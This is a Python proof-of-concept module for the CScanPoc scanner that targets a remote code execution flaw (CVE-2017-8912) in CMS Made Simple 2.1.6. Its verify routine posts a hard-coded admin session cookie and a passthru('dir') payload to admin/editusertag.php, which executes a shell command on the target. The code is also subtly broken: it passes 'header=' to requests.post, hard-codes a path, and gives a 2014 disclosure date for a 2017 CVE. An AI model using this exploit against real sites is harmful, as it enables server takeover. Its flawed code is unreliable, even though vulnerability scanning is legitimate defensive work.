# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'CMSMS_0104'  # 平台漏洞编号
    name = 'CMS Made Simple(CMSMS)任意代码执行漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-03-03'  # 漏洞公布时间
    desc = '''模版漏洞描述
    CMS Made Simple(简称CMSMS)是一款优秀的轻量级开源内容管理系统(CMS)。
    CMS Made Simple存在任意代码执行漏洞。远程攻击者可以利用该漏洞，通过代码参数在admin/editusertag.php页面执行任意PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2017-09368'  # 漏洞来源
    cnvd_id = 'CNVD-2017-09368'  # cnvd漏洞编号
    cve_id = 'CVE-2017-8912'  # cve编号
    product = 'CMSMS'  # 漏洞组件名称
    product_version = '2.1.6'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8a079f60-ad6e-48ff-bfd4-9710b7ef824b'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-07-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                "cookies": {
                    'type': 'string',
                    'description': '管理员登录后cookie值',
                    'default': 'cms_admin_user_id=1; cms_passhash=4df45e48ad5885afabe27e446666421b; _sk_=2a7da2216d41e0ac; CMSSESSIDacef9ab5f31b=mckpbvrmtj7n6ri53kiol718c5',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/cms/cmsimple/admin/editusertag.php?_sk_=2a7da2216d41e0ac&userplugin_id=4"
            vul_url = self.target + payload
            vul_header = {
                "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
                "Accept": "*/*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Length": "115",
                "Cookie": self.get_option("cookies"),
                "Connection": "close",
                "Pragma": "no-cache",
                "Cache-Control": "no-cache"
            }
            data = '''_sk_=2a7da2216d41e0ac&userplugin_id=4&userplugin_name=aaa&code=passthru('dir')%3B&description=&run=1&apply=1&ajax=1'''
            _response = requests.post(vul_url, data=data, header=vul_header)
            if '''{"response":"Success","details":"}''' in _response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
